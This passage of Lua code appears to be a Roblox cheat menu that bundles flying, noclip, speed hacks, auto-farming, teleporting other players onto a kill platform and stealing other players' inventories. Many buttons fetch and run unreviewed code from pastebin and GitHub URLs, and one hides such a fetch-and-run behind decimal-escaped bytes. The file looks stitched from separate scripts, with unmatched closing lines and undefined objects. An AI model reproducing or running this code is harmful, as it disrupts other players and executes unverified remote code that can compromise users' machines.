ConsoleFrame.BackgroundTransparency = 0.5
ConsoleFrame.BorderSizePixel = 0
ConsoleFrame.Position = UDim2.new(0, 0, 0.153700188, 0)
ConsoleFrame.Size = UDim2.new(1, 0, 0.0967741907, 0)

Console.Name = "Console"
Console.Parent = ConsoleFrame
Console.BackgroundColor3 = Color3.new(1, 1, 1)
Console.BackgroundTransparency = 1
Console.BorderSizePixel = 0
Console.Position = UDim2.new(0.0387163423, 0, 0.117647059, 0)
Console.Size = UDim2.new(0.909523785, 0, 0.764705896, 0)
Console.Font = Enum.Font.SourceSans
Console.Text = "Status: Ready to use\n\n"
Console.TextColor3 = Color3.new(0.333333, 1, 0)
Console.TextScaled = true
Console.TextSize = 14
Console.TextWrapped = true
Console.TextXAlignment = Enum.TextXAlignment.Left
Console.TextYAlignment = Enum.TextYAlignment.Top

Frame_2.Parent = Main
Frame_2.BackgroundColor3 = Color3.new(0.0156863, 0.0156863, 0.0156863)
Frame_2.BackgroundTransparency = 0.5
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0, 0, 0.250474393, 0)
Frame_2.Size = UDim2.new(0.995238066, 0, 0.0417457297, 0)

TextLabel_4.Parent = Frame_2
TextLabel_4.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel_4.BackgroundTransparency = 1
TextLabel_4.BorderSizePixel = 0
TextLabel_4.Position = UDim2.new(0.0482401513, 0, 0.181818187, 0)
TextLabel_4.Size = UDim2.new(0.904306233, 0, 0.590909064, 0)
TextLabel_4.Font = Enum.Font.SourceSansSemibold
TextLabel_4.Text = "Main Mods"
TextLabel_4.TextColor3 = Color3.new(1, 1, 1)
TextLabel_4.TextScaled = true
TextLabel_4.TextSize = 14
TextLabel_4.TextWrapped = true
TextLabel_4.TextXAlignment = Enum.TextXAlignment.Left

Frame_3.Parent = Main
Frame_3.BackgroundColor3 = Color3.new(0.0156863, 0.0156863, 0.0156863)
Frame_3.BackgroundTransparency = 0.5
Frame_3.BorderSizePixel = 0
Frame_3.Position = UDim2.new(0, 0, 0.455407977, 0)
Frame_3.Size = UDim2.new(1, 0, 0.0417457297, 0)

TextLabel_5.Parent = Frame_3
TextLabel_5.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel_5.BackgroundTransparency = 1
TextLabel_5.BorderSizePixel = 0
TextLabel_5.Position = UDim2.new(0.0434782468, 0, 0.181818187, 0)
TextLabel_5.Size = UDim2.new(0.90476191, 0, 0.590909064, 0)
TextLabel_5.Font = Enum.Font.SourceSansSemibold
TextLabel_5.Text = "Weapon Mods"
TextLabel_5.TextColor3 = Color3.new(1, 1, 1)
TextLabel_5.TextScaled = true
TextLabel_5.TextSize = 14
TextLabel_5.TextWrapped = true
TextLabel_5.TextXAlignment = Enum.TextXAlignment.Left

Frame_4.Parent = Main
Frame_4.BackgroundColor3 = Color3.new(0.0156863, 0.0156863, 0.0156863)
Frame_4.BackgroundTransparency = 0.5
Frame_4.BorderSizePixel = 0
Frame_4.Position = UDim2.new(0, 0, 0.65464896, 0)
Frame_4.Size = UDim2.new(0.995238066, 0, 0.0417457297, 0)

TextLabel_6.Parent = Frame_4
TextLabel_6.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel_6.BackgroundTransparency = 1
TextLabel_6.BorderSizePixel = 0
TextLabel_6.Position = UDim2.new(0.0482401513, 0, 0.18181771, 0)
TextLabel_6.Size = UDim2.new(0.909090936, 0, 0.590909064, 0)
TextLabel_6.Font = Enum.Font.SourceSansSemibold
TextLabel_6.Text = "Local Player Mods"
TextLabel_6.TextColor3 = Color3.new(1, 1, 1)
TextLabel_6.TextScaled = true
TextLabel_6.TextSize = 14
TextLabel_6.TextWrapped = true
TextLabel_6.TextXAlignment = Enum.TextXAlignment.Left

KillPlatform.Name = "KillPlatform"
KillPlatform.Parent = Main
KillPlatform.BackgroundColor3 = Color3.new(1, 1, 1)
KillPlatform.BackgroundTransparency = 1
KillPlatform.Position = UDim2.new(0.0434782468, 0, 0.309297919, 0)
KillPlatform.Size = UDim2.new(0.90476191, 0, 0.034155596, 0)
KillPlatform.Font = Enum.Font.SourceSansSemibold
KillPlatform.Text = "Kill Platform "
KillPlatform.TextColor3 = Color3.new(1, 1, 1)
KillPlatform.TextScaled = true
KillPlatform.TextSize = 14
KillPlatform.TextWrapped = true
KillPlatform.TextXAlignment = Enum.TextXAlignment.Left

StealKills.Name = "StealKills"
StealKills.Parent = Main
StealKills.BackgroundColor3 = Color3.new(1, 1, 1)
StealKills.BackgroundTransparency = 1
StealKills.Position = UDim2.new(0.0434782468, 0, 0.354838729, 0)
StealKills.Size = UDim2.new(0.90476191, 0, 0.034155596, 0)
StealKills.Font = Enum.Font.SourceSansSemibold
StealKills.Text = "Steal Kills"
StealKills.TextColor3 = Color3.new(1, 1, 1)
StealKills.TextScaled = true
StealKills.TextSize = 14
StealKills.TextWrapped = true
StealKills.TextXAlignment = Enum.TextXAlignment.Left

AutoFarm.Name = "AutoFarm"
AutoFarm.Parent = Main
AutoFarm.BackgroundColor3 = Color3.new(1, 1, 1)
AutoFarm.BackgroundTransparency = 1
AutoFarm.Position = UDim2.new(0.0434782468, 0, 0.400379539, 0)
AutoFarm.Size = UDim2.new(0.90476191, 0, 0.034155596, 0)
AutoFarm.Font = Enum.Font.SourceSansSemibold
AutoFarm.Text = "Auto Farm"
AutoFarm.TextColor3 = Color3.new(1, 1, 1)
AutoFarm.TextScaled = true
AutoFarm.TextSize = 14
AutoFarm.TextWrapped = true
AutoFarm.TextXAlignment = Enum.TextXAlignment.Left

NoRecoil.Name = "NoRecoil"
NoRecoil.Parent = Main
NoRecoil.BackgroundColor3 = Color3.new(1, 1, 1)
NoRecoil.BackgroundTransparency = 1
NoRecoil.Position = UDim2.new(0.0434782468, 0, 0.510436416, 0)
NoRecoil.Size = UDim2.new(0.90476191, 0, 0.034155596, 0)
NoRecoil.Font = Enum.Font.SourceSansSemibold
NoRecoil.Text = "No Recoil"
NoRecoil.TextColor3 = Color3.new(1, 1, 1)
NoRecoil.TextScaled = true
NoRecoil.TextSize = 14
NoRecoil.TextWrapped = true
NoRecoil.TextXAlignment = Enum.TextXAlignment.Left

Guns.Name = "Guns"
Guns.Parent = Main
Guns.BackgroundColor3 = Color3.new(1, 1, 1)
Guns.BackgroundTransparency = 1
Guns.Position = UDim2.new(0.0434782468, 0, 0.555977225, 0)
Guns.Size = UDim2.new(0.90476191, 0, 0.034155596, 0)
Guns.Font = Enum.Font.SourceSansSemibold
Guns.Text = "Equip All Guns"
Guns.TextColor3 = Color3.new(1, 1, 1)
Guns.TextScaled = true
Guns.TextSize = 14
Guns.TextWrapped = true
Guns.TextXAlignment = Enum.TextXAlignment.Left

Knifes.Name = "Knifes"
Knifes.Parent = Main
Knifes.BackgroundColor3 = Color3.new(1, 1, 1)
Knifes.BackgroundTransparency = 1
Knifes.Position = UDim2.new(0.0434782468, 0, 0.603415549, 0)
Knifes.Size = UDim2.new(0.90476191, 0, 0.034155596, 0)
Knifes.Font = Enum.Font.SourceSansSemibold
Knifes.Text = "Equip All Knifes "
Knifes.TextColor3 = Color3.new(1, 1, 1)
Knifes.TextScaled = true
Knifes.TextSize = 14
Knifes.TextWrapped = true
Knifes.TextXAlignment = Enum.TextXAlignment.Left

Fly.Name = "Fly"
Fly.Parent = Main
Fly.BackgroundColor3 = Color3.new(1, 1, 1)
Fly.BackgroundTransparency = 1
Fly.Position = UDim2.new(0.0434782468, 0, 0.709677398, 0)
Fly.Size = UDim2.new(0.90476191, 0, 0.034155596, 0)
Fly.Font = Enum.Font.SourceSansSemibold
Fly.Text = "Toggle Flying Mode"
Fly.TextColor3 = Color3.new(1, 1, 1)
Fly.TextScaled = true
Fly.TextSize = 14
Fly.TextWrapped = true
Fly.TextXAlignment = Enum.TextXAlignment.Left

Noclip.Name = "Noclip"
Noclip.Parent = Main
Noclip.BackgroundColor3 = Color3.new(1, 1, 1)
Noclip.BackgroundTransparency = 1
Noclip.Position = UDim2.new(0.0434782468, 0, 0.755218208, 0)
Noclip.Size = UDim2.new(0.90476191, 0, 0.034155596, 0)
Noclip.Font = Enum.Font.SourceSansSemibold
Noclip.Text = "Toggle NoClip"
Noclip.TextColor3 = Color3.new(1, 1, 1)
Noclip.TextScaled = true
Noclip.TextSize = 14
Noclip.TextWrapped = true
Noclip.TextXAlignment = Enum.TextXAlignment.Left

Gravity.Name = "Gravity"
Gravity.Parent = Main
Gravity.BackgroundColor3 = Color3.new(1, 1, 1)
Gravity.BackgroundTransparency = 1
Gravity.Position = UDim2.new(0.0387163423, 0, 0.802656531, 0)
Gravity.Size = UDim2.new(0.90476191, 0, 0.034155596, 0)
Gravity.Font = Enum.Font.SourceSansSemibold
Gravity.Text = "Low Gravity"
Gravity.TextColor3 = Color3.new(1, 1, 1)
Gravity.TextScaled = true
Gravity.TextSize = 14
Gravity.TextWrapped = true
Gravity.TextXAlignment = Enum.TextXAlignment.Left

Speed.Name = "Speed"
Speed.Parent = Main
Speed.BackgroundColor3 = Color3.new(1, 1, 1)
Speed.BackgroundTransparency = 1
Speed.Position = UDim2.new(0.0387163423, 0, 0.851992369, 0)
Speed.Size = UDim2.new(0.90476191, 0, 0.034155596, 0)
Speed.Font = Enum.Font.SourceSansSemibold
Speed.Text = "Super Speed"
Speed.TextColor3 = Color3.new(1, 1, 1)
Speed.TextScaled = true
Speed.TextSize = 14
Speed.TextWrapped = true
Speed.TextXAlignment = Enum.TextXAlignment.Left

Jump.Name = "Jump"
Jump.Parent = Main
Jump.BackgroundColor3 = Color3.new(1, 1, 1)
Jump.BackgroundTransparency = 1
Jump.Position = UDim2.new(0.0434782468, 0, 0.899430692, 0)
Jump.Size = UDim2.new(0.90476191, 0, 0.034155596, 0)
Jump.Font = Enum.Font.SourceSansSemibold
Jump.Text = "Super Jump"
Jump.TextColor3 = Color3.new(1, 1, 1)
Jump.TextScaled = true
Jump.TextSize = 14
Jump.TextWrapped = true
Jump.TextXAlignment = Enum.TextXAlignment.Left

Btools.Name = "Btools"
Btools.Parent = Main
Btools.BackgroundColor3 = Color3.new(1, 1, 1)
Btools.BackgroundTransparency = 1
Btools.Position = UDim2.new(0.0434782468, 0, 0.946869016, 0)
Btools.Size = UDim2.new(0.90476191, 0, 0.034155596, 0)
Btools.Font = Enum.Font.SourceSansSemibold
Btools.Text = "B-Tools"
Btools.TextColor3 = Color3.new(1, 1, 1)
Btools.TextScaled = true
Btools.TextSize = 14
Btools.TextWrapped = true
Btools.TextXAlignment = Enum.TextXAlignment.Left
-- scripts 
Fly.MouseButton1Click:Connect(function()
Console.Text = ("Press E to activate and deactivate flying mode\n\n ")
wait(0.2)
loadstring(game:HttpGet(('https://pastebin.com/raw/7rXZ9VNc'),true))()
wait(5)
Console.Text = ("Status: Ready To Use\n\n")
end)

Noclip.MouseButton1Click:connect(function()
if Console.Text == "Toggle NoClip" then
noclip = true
Console.Text = "Toggle NoClip: On"
        Console.TextColor3 = Color3.new(0,185,0)
game:GetService('RunService').Stepped:connect(function()
if noclip then
game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
                 end
        end)
    elseif Console.Text == "Toggle NoClip: On" then
        noclip = false
        Console.Text = "Toggle NoClip: Off"
        Console.TextColor3 = Color3.new(170,0,0)
elseif Console.Text == "Toggle NoClip: On" then
    noclip = true
Console.Text = "Toggle NoClip: On"
        Console.TextColor3 = Color3.new(0,185,0)
    end
end)

Knifes.MouseButton1Click:connect(function()
	for _,Thing in pairs(game.ReplicatedStorage.Knives:GetChildren()) do
if Thing:IsA("Tool") then
Thing.Parent = game.Players.LocalPlayer.Backpack
end
end
end)

Guns.MouseButton1Click:connect(function()
	for _,Thing in pairs(game.ReplicatedStorage.Guns:GetChildren()) do
if Thing:IsA("Tool") then
Thing.Parent = game.Players.LocalPlayer.Backpack
end
end
end)

KillPlatform.MouseButton1Click:connect(function()
	plr = game:service'Players'.LocalPlayer
char = plr.Character
root = char.HumanoidRootPart
iszombie = false
 
platform = Instance.new('Part', workspace)
platform.Size = Vector3.new(100,0,100)
platform.Anchored = true
platform.Position = Vector3.new(555,555,555)
root.CFrame = platform.CFrame * CFrame.new(0,4,0)
 
if workspace:FindFirstChild(plr.Name) then
   iszombie = false
   warn'You are not a zombie!'
else
   iszombie = true
   warn'You are a zombie!'
end
 
wait(.5)
 
if not iszombie then
   for _, a in pairs(workspace.enemies:children()) do
       for _, b in pairs(a:children()) do
           if b:IsA'Part' then
               b.Anchored = true
               b.CFrame = root.CFrame * CFrame.new(2,0,2)
           end
       end
   end
elseif iszombie then
   for _, a in pairs(game:service'Players':GetPlayers()) do
       if a.Character then
           for _, b in pairs(a.Character:children()) do
               if b:IsA'Part' and a.Name ~= plr.Name then
                   b.Anchored = true
                   b.CFrame =  root.CFrame * CFrame.new(2,0,2)
               end
           end
       end
   end
end
end)

Speed.MouseButton1Click:connect(function()
	plr = game:service'Players'.LocalPlayer
char = plr.Character
hum = char:FindFirstChildOfClass'Humanoid'

hum.WalkSpeed = 60
	
end)

Jump.MouseButton1Click:connect(function()
	plr = game:service'Players'.LocalPlayer
char = plr.Character
hum = char:FindFirstChildOfClass'Humanoid'

hum.JumpPower = 100
end)

AutoFarm.MouseButton1Click:connect(function()
	local groundDistance = 8
local Player = game:GetService("Players").LocalPlayer
local function getNearest()
local nearest, dist = nil, 99999
for _,v in pairs(game.Workspace.BossFolder:GetChildren()) do
if(v:FindFirstChild("Head")~=nil)then
local m =(Player.Character.Head.Position-v.Head.Position).magnitude
if(m<dist)then
dist = m
nearest = v
end
end
end
for _,v in pairs(game.Workspace.enemies:GetChildren()) do
if(v:FindFirstChild("Head")~=nil)then
local m =(Player.Character.Head.Position-v.Head.Position).magnitude
if(m<dist)then
dist = m
nearest = v
end
end
end
return nearest
end
_G.farm2 = true
Player.Chatted:Connect(function(m)
if(m==";autofarm false")then
_G.farm2 = false
elseif(m==";autofarm true")then
_G.farm2 = true
end
end)
_G.globalTarget = nil
game:GetService("RunService").RenderStepped:Connect(function()
if(_G.farm2==true)then
local target = getNearest()
if(target~=nil)then
game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(game:GetService("Workspace").CurrentCamera.CFrame.p, target.Head.Position)
Player.Character.HumanoidRootPart.CFrame = (target.HumanoidRootPart.CFrame * CFrame.new(0, groundDistance, 9))
_G.globalTarget = target
end
end
end)
spawn(function()
while wait() do
game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
game.Players.LocalPlayer.Character.Torso.Velocity = Vector3.new(0,0,0)
end
end)
while wait() do
if(_G.farm2==true and _G.globalTarget~=nil and _G.globalTarget:FindFirstChild("Head") and Player.Character:FindFirstChildOfClass("Tool"))then
local target = _G.globalTarget
game.ReplicatedStorage.Gun:FireServer({["Normal"] = Vector3.new(0, 0, 0), ["Direction"] = target.Head.Position, ["Name"] = Player.Character:FindFirstChildOfClass("Tool").Name, ["Hit"] = target.Head, ["Origin"] = target.Head.Position, ["Pos"] = target.Head.Position,})
wait()
end
end
end)

Btools.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/T0qaXjAR", true))()
end)

Gravity.MouseButton1Click:connect(function()
	game.Workspace.Gravity = 5
end)
end)

local Section = Tab:NewSection("Bulked Up")

Section:NewButton("Bulked Up AutoFarm", "Collect Gem idiot", function()
    loadstring(game:HttpGet(("https://dosage.wtf/files/bulkedup.lua"), true))()
end)


local Section = Tab:NewSection("Break In")

Section:NewButton("Break In Gui 1", "I don't play this game", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RubyBoo4life/break-in-v1/main/.gitignore"))();
end)

Section:NewButton("Break in Gui 2", "idk this game", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/RubyBoo4life/break-in-v1/main/.gitignore"))();
end)

Section:NewButton("Break in Gui 3", "Bruh", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/MHx8q6xP'),true))()
end)

local Section = Tab:NewSection("Adopt Me")

Section:NewButton("Adopt Me AutoFarm", "New and Op", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/BloxiYT/Diamond/main/AdoptMe"))()
end)
























--Fe--
local Tab = Window:NewTab("Fe")
local Section = Tab:NewSection("People can see what you Look like")

Section:NewButton("Netless bypass", "I dont know what say to this script", function()
    net = true
notify = true 
loadstring("\13\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\71\101\116\79\98\106\101\99\116\115\40\34\114\98\120\97\115\115\101\116\105\100\58\47\47\55\50\53\55\55\54\49\55\56\53\34\41\91\49\93\46\83\111\117\114\99\101\41\40\41\13\10")()
end)

Section:NewButton("Netless Bypass 2", "idk", function()
loadstring(game:HttpGet('https://pastebin.com/raw/7Jtggrqx'))()
end)

Section:NewButton("Netless v3", "exactly", function()
    for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
    if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then 
    game:GetService("RunService").Heartbeat:connect(function()
    v.Velocity = Vector3.new(-30,0,0)
    end)
    end
    end
    
    game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "Netless Successfully ran";
        Text = "yeah";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
end)

Section:NewButton("Fe Headless", "Damn you rich now", function()

local lp = game:GetService "Players".LocalPlayer
if lp.Character:FindFirstChild "Head" then
    local char = lp.Character
    char.Archivable = true
    local new = char:Clone()
    new.Parent = workspace
    lp.Character = new
    wait(2)
    local oldhum = char:FindFirstChildWhichIsA "Humanoid"
    local newhum = oldhum:Clone()
    newhum.Parent = char
    newhum.RequiresNeck = false
    oldhum.Parent = nil
    wait(2)
    lp.Character = char
    new:Destroy()
    wait(1)
    newhum:GetPropertyChangedSignal("Health"):Connect(
        function()
            if newhum.Health <= 0 then
                oldhum.Parent = lp.Character
                wait(1)
                oldhum:Destroy()
            end
        end)
    workspace.CurrentCamera.CameraSubject = char
    if char:FindFirstChild "Animate" then
        char.Animate.Disabled = true
        wait(.1)
        char.Animate.Disabled = false
    end
    lp.Character:FindFirstChild "Head":Destroy()
end
end)

Section:NewButton("Fe Spider", "Normal spider thank God", function()
loadstring(game:HttpGet('https://pastebin.com/raw/txsk1LJg'))()
end)

Section:NewButton("Fe Creepy Crawler", "Damn creepy", function()
loadstring(game:HttpGet('https://pastebin.com/raw/eMmgNCQV'))()
end)

Section:NewButton("Fe Curse Spider", "Damn Thats ugly lol", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/tyreltrijo/Cursed/main/Spider'))()
end)

Section:NewButton("Steal Player inventory Fe", "lol you are a robber then", function()
   for i,v in pairs (game.Players:GetChildren()) do
wait()
for i,b in pairs (v.Backpack:GetChildren()) do
b.Parent = game.Players.LocalPlayer.Backpack
end
end
end)


Section:NewButton("Fe Caducus(Need: Netless and Keyboard)", "Evil Demon", function()
   loadstring(game:HttpGet("https://pastebin.com/raw/inJpRzmV",true))()
end)

Section:NewButton("Fe Slasher", "Yellow slasher hat is required", function()
   loadstring(game:HttpGet(('https://raw.githubusercontent.com/Toasty8i/slasher/main/slasher.lua'),true))()
end)

Section:NewButton("Fe BackFlip", "Cool Backflip", function()
   loadstring(game:HttpGet('https://pastebin.com/raw/yjxXnxbS'))()
end)

Section:NewButton("Fe Invisible", "Works For all Game", function()
-- Gui to Lua
-- Version: 3.2

-- Instances:

loadstring(game:HttpGet(('https://raw.githubusercontent.com/manimcool21/Keyboard-FE/main/Protected%20(3).lua'),true))()
local KeyboardguiWarriorRoberrVersion = Instance.new("ScreenGui")
local Drag = Instance.new("Frame")
local Close = Instance.new("TextButton")

--Properties:

KeyboardguiWarriorRoberrVersion.Name = "Keyboard gui WarriorRoberr Version"
KeyboardguiWarriorRoberrVersion.Parent = game.CoreGui
KeyboardguiWarriorRoberrVersion.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Drag.Name = "Drag"
Drag.Parent = KeyboardguiWarriorRoberrVersion
Drag.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Drag.BorderSizePixel = 0
Drag.Position = UDim2.new(0.147916675, 0, 0.0593749993, 0)
Drag.Size = UDim2.new(0, 270, 0, 30)
Drag.Active = true
Drag.Draggable = true

Close.Name = "Close"
Close.Parent = Drag
Close.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Close.BorderSizePixel = 0
Close.Position = UDim2.new(0.999839723, 0, -0.00729167089, 0)
Close.Size = UDim2.new(0, 30, 0, 30)
Close.Font = Enum.Font.SourceSans
Close.Text = "X"
Close.TextColor3 = Color3.fromRGB(255, 255, 255)
Close.TextSize = 35.000
Close.MouseButton1Click:Connect(function()
	KeyboardguiWarriorRoberrVersion:Destroy()
end)
game.CoreGui["BUNB0yBUN BOARD"].KeyBoard.Parent = Drag
game.CoreGui["BUNB0yBUN BOARD"]:Destroy()
game.CoreGui["Keyboard gui WarriorRoberr Version"].Drag.KeyBoard.Bunb0ybun.Text = "MADE BY WARRIORROBERR BETTER VERSION "
game.CoreGui["Keyboard gui WarriorRoberr Version"].Drag.KeyBoard.Position = UDim2.new(0, 0, 0, 35)
game.CoreGui["Keyboard gui WarriorRoberr Version"].Drag.KeyBoard.Bunb0ybun.TextSize = 10
end)

Section:NewButton("Fe Neko Animation", "Be A Anime Cat lol", function()
   loadstring(game:HttpGet(('https://pastebin.com/raw/Cu7bKQWN'),true))()
end)


Section:NewButton("Fe Small", "SO SMALL SO CUTE", function()
   --Shit ass script made by failedmite57926
 
local LocalPlayer = game:GetService("Players").LocalPlayer
local Character = LocalPlayer.Character
local Humanoid = Character:FindFirstChildOfClass("Humanoid")
 
local function rm()
	for i,v in pairs(Character:GetDescendants()) do
		if v:IsA("BasePart") then
			if v.Name ~= "Head" then
				for i,cav in pairs(v:GetDescendants()) do
					if cav:IsA("Attachment") then
						if cav:FindFirstChild("OriginalPosition") then
							cav.OriginalPosition:Destroy()
						end
					end
				end
				v:FindFirstChild("OriginalSize"):Destroy()
				if v:FindFirstChild("AvatarPartScaleType") then
					v:FindFirstChild("AvatarPartScaleType"):Destroy()
				end
			end
		end
	end
end
 
rm()
wait(0.5)
Humanoid:FindFirstChild("BodyTypeScale"):Destroy()
wait(1)
 
rm()
wait(0.5)
Humanoid:FindFirstChild("BodyWidthScale"):Destroy()
wait(1)
 
rm()
wait(0.5)
Humanoid:FindFirstChild("BodyDepthScale"):Destroy()
wait(1)
 
rm()
wait(0.5)
Humanoid:FindFirstChild("HeadScale"):Destroy()
wait(1)
end)



Section:NewButton("FeWaiter(Hat Needed)", "Dessert-Plate-Hat", function()
--[[ Made By Ice & Fire0001


????â„Ž???? ????????????????????????


]]-- Made By 09Ice_Fire09


-- Equip https://www.roblox.com/catalog/8862923874/Dessert-Plate-Hat To Continue:




--[[

Controls:
e = Offer The Meal. + Click = Show The Meal. (not fling)
q = Eat The Meal
Click = Punch (fling)

]]--

   loadstring(game:HttpGet(('https://raw.githubusercontent.com/kakabok1233453/asdasda/main/The Waiter'),true))()
end)


Section:NewButton("Fe Perm Animation", "different walk style", function()
   loadstring(game:HttpGet("https://pastebin.com/raw/Q8cVLfb0",true))()
end)

Section:NewButton("Among Us", "Sus", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/tyreltrijo/Amogus/main/Among%20Us'))()
end)


Section:NewButton("Fe L Emote", "Lol bozo", function()
-- FE Clowned Made by Nil <3
-- Mizt Source by Melon <3
       loadstring(game:HttpGet(('https://gist.githubusercontent.com/Nilrogram/93a7d51b0ef7b29cfcd94e44df492023/raw/e0bdab89a342aa09fcad6c81cd735c493e52fda6/FE%2520Clowned'),true))();
end)

Section:NewButton("Bang r15", "Find it out by yourself", function()
       loadstring(game:HttpGet('https://raw.githubusercontent.com/manimcool21/bang/main/Protected%20(27).lua'))()
end)

Section:NewButton("Fe Ninja Animation", "Run like a ninja", function()
       loadstring(game:HttpGet('https://gist.githubusercontent.com/1BlueCat/fb19e99add071128a9f04444da0beea4/raw/a9f5b8003e940c11cf820e39f99b5c19e7c64bf4/FE%2520Ninja'))()
end)

Section:NewButton("Fe 2007 animation", "we miss the old days", function()
game.Players.LocalPlayer.Character:BreakJoints()
   game.Players.LocalPlayer.Character=nil
   Connection = game.Workspace.DescendantAdded:Connect(function(c)
       if c.Name == "Animate" then
           c.Disabled=true        
       end
   end)
   repeat wait() until game.Players.LocalPlayer.Character
   Char = game.Players.LocalPlayer.Character
   Died = game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Died:Connect(function()
       Connection:Disconnect()
       Died:Disconnect()
   end)
   wait(.1)
   function waitForChild(parent, childName)
local child = parent:findFirstChild(childName)
if child then return child end
while true do
 child = parent.ChildAdded:wait()
 if child.Name==childName then return child end
end
end

-- ANIMATION

-- declarations

local decal = Instance.new("Decal", game.Players.LocalPlayer.Character)
for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
	if v.ClassName == "Part" then
		if v.Name == "Head" then
			local torsotec = Instance.new("Decal", torso)
			torsotec.Texture = "http://www.roblox.com/asset/?id=782560028"
			local headd = Instance.new("Decal", v)
			headd.Texture = "http://www.roblox.com/asset/?id=20676546"
		else
			v.Transparency = 1
		end
	end
	if v.ClassName == "Accessory" or v.ClassName == "Hat" then
		v:destroy()
	end
end
if game.Players.LocalPlayer.Character.Head:findFirstChild("face") then
	game.Players.LocalPlayer.Character.Head["face"]:destroy()
end
rhand = Instance.new("Part", game.Players.LocalPlayer.Character)
rhand.Size = game.Players.LocalPlayer.Character["Right Arm"].Size
rhand.TopSurface = "Smooth"
rhand.BottomSurface = "Smooth"
rhand.Parent = game.Players.LocalPlayer.Character
rhand:BreakJoints()
rhand.CanCollide = false
rhweld = Instance.new("Weld", rhand)
rhweld.Part0 = game.Players.LocalPlayer.Character["Right Arm"]
rhweld.Part1 = rhand
--
lhand = Instance.new("Part", game.Players.LocalPlayer.Character)
lhand.Size = game.Players.LocalPlayer.Character["Left Arm"].Size
lhand.TopSurface = "Smooth"
lhand.BottomSurface = "Smooth"
lhand.CanCollide = false
lhand.Parent = game.Players.LocalPlayer.Character
lhand:BreakJoints()
rhweld1 = Instance.new("Weld", lhand)
rhweld1.Part0 = game.Players.LocalPlayer.Character["Left Arm"]
rhweld1.Part1 = lhand
--
lleg = Instance.new("Part", game.Players.LocalPlayer.Character)
lleg.Size = game.Players.LocalPlayer.Character["Left Leg"].Size
lleg.TopSurface = "Smooth"
lleg.CanCollide = false
lleg.BottomSurface = "Smooth"
lleg.Parent = game.Players.LocalPlayer.Character
lleg:BreakJoints()
rhweld11 = Instance.new("Weld", lleg)
rhweld11.Part0 = game.Players.LocalPlayer.Character["Left Leg"]
rhweld11.Part1 = lleg
--
rleg = Instance.new("Part", game.Players.LocalPlayer.Character)
rleg.Size = game.Players.LocalPlayer.Character["Right Leg"].Size
rleg.TopSurface = "Smooth"
rleg.BottomSurface = "Smooth"
rleg.Parent = game.Players.LocalPlayer.Character
rleg.CanCollide = false
rleg:BreakJoints()
rhweld111 = Instance.new("Weld", rleg)
rhweld111.Part0 = game.Players.LocalPlayer.Character["Right Leg"]
rhweld111.Part1 = rleg
--
torso = Instance.new("Part", game.Players.LocalPlayer.Character)
torso.Size = game.Players.LocalPlayer.Character.Torso.Size
torso.TopSurface = "Smooth"
torso.BottomSurface = "Smooth"
torso.CanCollide = false
torso.Parent = game.Players.LocalPlayer.Character
torso:BreakJoints()
rhweld1111 = Instance.new("Weld", torso)
rhweld1111.Part0 = game.Players.LocalPlayer.Character.Torso
rhweld1111.Part1 = torso
rhand.Color = game.Players.LocalPlayer.Character["Right Arm"].Color
lhand.Color = game.Players.LocalPlayer.Character["Left Arm"].Color
rleg.Color = game.Players.LocalPlayer.Character["Right Leg"].Color
torso.Color = game.Players.LocalPlayer.Character.Torso.Color
lleg.Color = game.Players.LocalPlayer.Character["Left Leg"].Color
decal = Instance.new("Decal", torso)
decal.Texture = "http://www.roblox.com/asset/?id=782560028"
nostalgie  = Instance.new("Sound", game.Players.LocalPlayer.Character)
nostalgie.SoundId = "rbxassetid://1000016620"
nostalgie.Looped = true
nostalgie:Play()
nostalgie.Volume = 10
canuse = true
local shouldertec = Instance.new("Decal", lhand)
shouldertec.Texture = "http://www.roblox.com/asset/?id=77986517"
shouldertec.Face = "Top"
local shouldertec1 = Instance.new("Decal", rhand)
shouldertec1.Texture = "http://www.roblox.com/asset/?id=77986517"
shouldertec1.Face = "Top"
local shouldertec11 = Instance.new("Decal", rhand)
shouldertec11.Texture = "http://www.roblox.com/asset/?id=178274539"
shouldertec11.Face = "Bottom"
local shouldertec111 = Instance.new("Decal", lhand)
shouldertec111.Texture = "http://www.roblox.com/asset/?id=178274539"
shouldertec111.Face = "Bottom"
local legtec = Instance.new("Decal", lleg)
legtec.Texture = "http://www.roblox.com/asset/?id=178274539"
legtec.Face = "Bottom"
local legtec1 = Instance.new("Decal", rleg)
legtec1.Texture = "http://www.roblox.com/asset/?id=178274539"
legtec1.Face = "Bottom"

local Figure = game.Players.LocalPlayer.Character
local Torso = waitForChild(Figure, "Torso")
local RightShoulder = waitForChild(Torso, "Right Shoulder")
local LeftShoulder = waitForChild(Torso, "Left Shoulder")
local RightHip = waitForChild(Torso, "Right Hip")
local LeftHip = waitForChild(Torso, "Left Hip")
local Neck = waitForChild(Torso, "Neck")
local Humanoid = waitForChild(Figure, "Humanoid")
local pose = "Standing"

local toolAnim = "None"
local toolAnimTime = 0

local jumpMaxLimbVelocity = 0.75

-- functions

function onRunning(speed)
if speed>0 then
 pose = "Running"
else
 pose = "Standing"
end
end

function onDied()
pose = "Dead"
end

function onJumping()
pose = "Jumping"
end

function onClimbing()
pose = "Climbing"
end

function onGettingUp()
pose = "GettingUp"
end

function onFreeFall()
pose = "FreeFall"
end

